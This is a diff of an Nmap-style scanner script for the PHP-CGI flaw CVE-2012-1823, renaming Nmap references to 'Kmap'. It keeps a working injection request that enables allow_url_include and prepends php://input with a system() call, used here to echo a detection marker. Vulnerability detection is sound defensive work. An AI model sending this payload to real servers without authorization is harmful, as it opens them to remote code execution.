@@ -17,8 +17,8 @@ vulnerable installations.
 
 ---
 -- @usage
--- nmap -sV --script http-vuln-cve2012-1823 <target>
--- nmap -p80 --script http-vuln-cve2012-1823 --script-args http-vuln-cve2012-1823.uri=/test.php <target>
+-- kmap -sV --script http-vuln-cve2012-1823 <target>
+-- kmap -p80 --script http-vuln-cve2012-1823 --script-args http-vuln-cve2012-1823.uri=/test.php <target>
 -- @output
 -- PORT   STATE SERVICE REASON
 -- 80/tcp open  http    syn-ack
@@ -49,7 +49,7 @@ vulnerable installations.
 ---
 
 author = {"Paulino Calderon <calderon@websec.mx>", "Paul AMAR <aos.paul@gmail.com>"}
-license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
+license = "Same as Kmap--See https://kmap.org/book/man-legal.html"
 categories = {"exploit","vuln","intrusive"}
 
 
@@ -83,9 +83,9 @@ code execution.]],
   local vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)
 
   stdnse.debug2("Trying detection using echo command")
-  local detection_session = http.post(host, port, uri.."?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", { no_cache = true }, nil, "<?php system('echo NmapCVEIdentification');die(); ?>")
+  local detection_session = http.post(host, port, uri.."?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", { no_cache = true }, nil, "<?php system('echo KmapCVEIdentification');die(); ?>")
   if detection_session and detection_session.status == 200 then
-    if string.match(detection_session.body, "NmapCVEIdentification") then
+    if string.match(detection_session.body, "KmapCVEIdentification") then
       stdnse.debug1("The website seems vulnerable to CVE-2012-1823.")
     else
       return
